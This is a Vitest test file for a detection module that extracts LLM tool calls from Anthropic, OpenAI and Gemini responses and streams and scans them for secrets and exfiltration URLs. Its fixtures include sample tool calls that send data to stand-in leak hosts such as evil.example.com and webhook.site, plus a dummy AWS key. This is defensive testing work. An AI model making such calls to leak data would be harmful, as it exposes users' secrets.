import { describe, it, expect } from 'vitest'
import {
  extractToolCallsFromJson,
  extractToolCallsFromSse,
  serializeToolArgs,
  extractArgUrls,
  scanToolCallsForExfil,
} from '../../src/detection/toolUseScan.js'
import { getParser } from '../../src/detection/parsers.js'
import { DlpScanner } from '../../src/detection/dlp/scanner.js'
import { DEFAULT_CONFIG } from '../../src/config/config.js'

// ---------------------------------------------------------------------------
// extractToolCallsFromJson — per-provider buffered extraction (delegates to
// the parser's own extractToolUses; these tests pin the contract this module
// depends on).
// ---------------------------------------------------------------------------

describe('extractToolCallsFromJson', () => {
  it('extracts an Anthropic tool_use block', () => {
    const parser = getParser('/v1/messages')!
    const body = JSON.stringify({
      type: 'message',
      content: [
        { type: 'text', text: 'hi' },
        { type: 'tool_use', id: 'tu1', name: 'send_email', input: { to: 'x@example.com', body: 'hello' } },
      ],
    })
    const calls = extractToolCallsFromJson(body, parser)
    expect(calls).toHaveLength(1)
    expect(calls[0]).toEqual({ toolName: 'send_email', args: { to: 'x@example.com', body: 'hello' } })
  })

  it('extracts an OpenAI tool_calls block (choices[].message.tool_calls)', () => {
    const parser = getParser('/v1/chat/completions')!
    const body = JSON.stringify({
      choices: [{
        message: {
          role: 'assistant',
          tool_calls: [{ id: 'call_1', type: 'function', function: { name: 'fetch_url', arguments: JSON.stringify({ url: 'https://example.com' }) } }],
        },
      }],
    })
    const calls = extractToolCallsFromJson(body, parser)
    expect(calls).toHaveLength(1)
    expect(calls[0]).toEqual({ toolName: 'fetch_url', args: { url: 'https://example.com' } })
  })

  it('extracts an OpenAI Responses-API function_call output item', () => {
    const parser = getParser('/v1/responses')!
    const body = JSON.stringify({
      output: [{ type: 'function_call', name: 'lookup', arguments: JSON.stringify({ q: 'weather' }) }],
    })
    const calls = extractToolCallsFromJson(body, parser)
    expect(calls).toHaveLength(1)
    expect(calls[0]).toEqual({ toolName: 'lookup', args: { q: 'weather' } })
  })

  it('extracts a Gemini functionCall part', () => {
    const parser = getParser('/v1beta/models/gemini-1.5-pro:generateContent')!
    const body = JSON.stringify({
      candidates: [{ content: { parts: [{ functionCall: { name: 'send_data', args: { dest: 'https://example.com' } } }] } }],
    })
    const calls = extractToolCallsFromJson(body, parser)
    expect(calls).toHaveLength(1)
    expect(calls[0]).toEqual({ toolName: 'send_data', args: { dest: 'https://example.com' } })
  })

  it('returns [] for a benign text-only response (no tool calls)', () => {
    const parser = getParser('/v1/messages')!
    const body = JSON.stringify({ type: 'message', content: [{ type: 'text', text: 'just an answer' }] })
    expect(extractToolCallsFromJson(body, parser)).toEqual([])
  })

  it('returns [] for invalid JSON rather than throwing', () => {
    const parser = getParser('/v1/messages')!
    expect(extractToolCallsFromJson('NOT JSON {{{', parser)).toEqual([])
  })
})

// ---------------------------------------------------------------------------
// extractToolCallsFromSse — flushed SSE reconstruction
// ---------------------------------------------------------------------------

function anthropicSse(toolName: string, argsJson: string): string {
  const ev = (type: string, obj: Record<string, unknown>) => `event: ${type}\ndata: ${JSON.stringify({ type, ...obj })}\n\n`
  return [
    ev('message_start', { message: { id: 'msg_1', role: 'assistant' } }),
    ev('content_block_start', { index: 0, content_block: { type: 'text', text: '' } }),
    ev('content_block_delta', { index: 0, delta: { type: 'text_delta', text: 'Let me check.' } }),
    ev('content_block_stop', { index: 0 }),
    ev('content_block_start', { index: 1, content_block: { type: 'tool_use', id: 'tu1', name: toolName, input: {} } }),
    ev('content_block_delta', { index: 1, delta: { type: 'input_json_delta', partial_json: argsJson } }),
    ev('content_block_stop', { index: 1 }),
    ev('message_delta', { delta: { stop_reason: 'tool_use' } }),
    ev('message_stop', {}),
  ].join('')
}

function openAiSse(toolName: string, argFragments: string[]): string {
  const ev = (data: Record<string, unknown>) => `data: ${JSON.stringify(data)}\n\n`
  const events = [
    ev({ choices: [{ index: 0, delta: { role: 'assistant', tool_calls: [{ index: 0, id: 'call_1', type: 'function', function: { name: toolName, arguments: '' } }] }, finish_reason: null }] }),
  ]
  for (const frag of argFragments) {
    events.push(ev({ choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: frag } }] }, finish_reason: null }] }))
  }
  events.push(ev({ choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] }))
  events.push('data: [DONE]\n\n')
  return events.join('')
}

function geminiSse(toolName: string, args: Record<string, unknown>): string {
  return `data: ${JSON.stringify({ candidates: [{ content: { parts: [{ functionCall: { name: toolName, args } }] } }] })}\n\n`
}

describe('extractToolCallsFromSse', () => {
  it('reconstructs an Anthropic tool_use block from content_block_start/delta/stop', () => {
    const stream = anthropicSse('write_file', '{"path":"/tmp/x","content":"secret data"}')
    const calls = extractToolCallsFromSse(stream)
    expect(calls).toHaveLength(1)
    expect(calls[0]).toEqual({ toolName: 'write_file', args: { path: '/tmp/x', content: 'secret data' } })
  })

  it('reconstructs an OpenAI tool call from fragmented delta.tool_calls[]', () => {
    const stream = openAiSse('fetch_url', ['{"url"', ':"https://example.com"}'])
    const calls = extractToolCallsFromSse(stream)
    expect(calls).toHaveLength(1)
    expect(calls[0]).toEqual({ toolName: 'fetch_url', args: { url: 'https://example.com' } })
  })

  it('reconstructs a Gemini functionCall event (already whole, no fragmentation)', () => {
    const stream = geminiSse('send_data', { dest: 'https://example.com' })
    const calls = extractToolCallsFromSse(stream)
    expect(calls).toHaveLength(1)
    expect(calls[0]).toEqual({ toolName: 'send_data', args: { dest: 'https://example.com' } })
  })

  it('returns [] for a text-only Anthropic stream', () => {
    const ev = (type: string, obj: Record<string, unknown>) => `event: ${type}\ndata: ${JSON.stringify({ type, ...obj })}\n\n`
    const stream = [
      ev('content_block_start', { index: 0, content_block: { type: 'text', text: '' } }),
      ev('content_block_delta', { index: 0, delta: { type: 'text_delta', text: 'Hello' } }),
      ev('content_block_stop', { index: 0 }),
    ].join('')
    expect(extractToolCallsFromSse(stream)).toEqual([])
  })

  it('handles a truncated stream (no content_block_stop) by best-effort finalizing the open block', () => {
    const ev = (type: string, obj: Record<string, unknown>) => `event: ${type}\ndata: ${JSON.stringify({ type, ...obj })}\n\n`
    const stream = [
      ev('content_block_start', { index: 0, content_block: { type: 'tool_use', name: 'partial_tool', input: {} } }),
      ev('content_block_delta', { index: 0, delta: { type: 'input_json_delta', partial_json: '{"secret":"abc' } }),
    ].join('')
    const calls = extractToolCallsFromSse(stream)
    expect(calls).toHaveLength(1)
    expect(calls[0]!.toolName).toBe('partial_tool')
    // Unterminated JSON — kept as the raw accumulated string rather than dropped.
    expect(calls[0]!.args).toBe('{"secret":"abc')
  })

  it('returns [] for empty input', () => {
    expect(extractToolCallsFromSse('')).toEqual([])
  })
})

// ---------------------------------------------------------------------------
// serializeToolArgs / extractArgUrls
// ---------------------------------------------------------------------------

describe('serializeToolArgs', () => {
  it('serializes an object to JSON', () => {
    expect(serializeToolArgs({ a: 1 })).toBe('{"a":1}')
  })

  it('passes a string through unchanged', () => {
    expect(serializeToolArgs('raw string')).toBe('raw string')
  })
})

describe('extractArgUrls', () => {
  it('finds URLs embedded in serialized JSON args', () => {
    const text = JSON.stringify({ url: 'https://evil.example.com/leak?d=secret', note: 'ok' })
    expect(extractArgUrls(text)).toEqual(['https://evil.example.com/leak?d=secret'])
  })

  it('dedupes repeated URLs', () => {
    const text = 'https://x.example.com/a https://x.example.com/a'
    expect(extractArgUrls(text)).toEqual(['https://x.example.com/a'])
  })

  it('returns [] when there is no URL', () => {
    expect(extractArgUrls('{"cmd":"ls"}')).toEqual([])
  })
})

// ---------------------------------------------------------------------------
// scanToolCallsForExfil — DLP + URL classifier composition
// ---------------------------------------------------------------------------

describe('scanToolCallsForExfil', () => {
  const dlp = new DlpScanner(DEFAULT_CONFIG.dlp)
  const isExfilUrl = (h: string) => h === 'evil.example.com' || h === 'webhook.site'

  it('flags a DLP hit in tool-call arguments', () => {
    const calls = [{ toolName: 'write_file', args: { path: '/tmp/x', content: 'AKIAABCDEFGHIJKLMNOP' } }]
    const findings = scanToolCallsForExfil(calls, dlp, isExfilUrl)
    expect(findings).toHaveLength(1)
    expect(findings[0]!.toolName).toBe('write_file')
    expect(findings[0]!.dlpFindings.some(f => f.type === 'AWS_ACCESS_KEY')).toBe(true)
    expect(findings[0]!.urlFindings).toEqual([])
  })

  it('flags a URL-classifier hit (known exfil sink) in tool-call arguments', () => {
    const calls = [{ toolName: 'fetch_url', args: { url: 'https://webhook.site/abc?d=leak' } }]
    const findings = scanToolCallsForExfil(calls, dlp, isExfilUrl)
    expect(findings).toHaveLength(1)
    expect(findings[0]!.urlFindings).toHaveLength(1)
    expect(findings[0]!.urlFindings[0]!.url).toBe('https://webhook.site/abc?d=leak')
    expect(findings[0]!.dlpFindings).toEqual([])
  })

  it('does not flag a benign tool call with no secrets or exfil URLs', () => {
    const calls = [{ toolName: 'get_weather', args: { city: 'Paris' } }]
    expect(scanToolCallsForExfil(calls, dlp, isExfilUrl)).toEqual([])
  })

  it('does not flag a URL to a non-exfil host', () => {
    const calls = [{ toolName: 'fetch_url', args: { url: 'https://trusted.example.com/data' } }]
    expect(scanToolCallsForExfil(calls, dlp, isExfilUrl)).toEqual([])
  })

  it('ignores calls with an empty tool name', () => {
    const calls = [{ toolName: '', args: { secret: 'AKIAABCDEFGHIJKLMNOP' } }]
    expect(scanToolCallsForExfil(calls, dlp, isExfilUrl)).toEqual([])
  })
})
